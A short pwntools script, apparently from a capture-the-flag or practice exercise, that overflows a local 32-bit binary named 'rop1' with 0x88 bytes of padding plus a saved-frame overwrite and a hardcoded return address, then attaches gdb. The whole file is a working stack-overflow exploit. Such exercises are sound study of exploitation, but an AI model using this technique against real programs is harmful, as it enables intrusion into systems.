from pwn import *

context(os='linux', arch='i386')
context.log_level = 'debug'

p = process('./rop1')

payload = 'a'*0x88 + 'b'*4 + p32(0x080484a4)
#payload += p32(0x080484a4)


p.sendline(payload)

gdb.attach(p)

p.interactive()
